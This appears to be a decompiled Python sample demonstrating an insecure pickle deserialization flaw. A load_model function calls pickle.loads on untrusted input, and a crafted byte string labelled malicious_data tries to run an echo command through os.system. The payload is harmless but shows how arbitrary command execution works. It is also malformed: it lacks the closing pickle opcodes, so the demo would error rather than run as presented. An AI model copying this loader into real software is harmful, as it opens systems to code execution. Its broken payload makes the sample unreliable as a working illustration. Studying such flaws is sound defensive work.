# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 406_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 635 bytes
import pickle

class MyModel:

    def __init__(self, model_data):
        self.model_data = model_data

    def train(self):
        print("Training model with data:", self.model_data)


def load_model(serialized_data):
    model = pickle.loads(serialized_data)
    return model


malicious_data = b"cos\nsystem\n(S'echo Vulnerable code executed!'\n)"
model = load_model(malicious_data)
model.train()

# okay decompiling 406_1.pyc
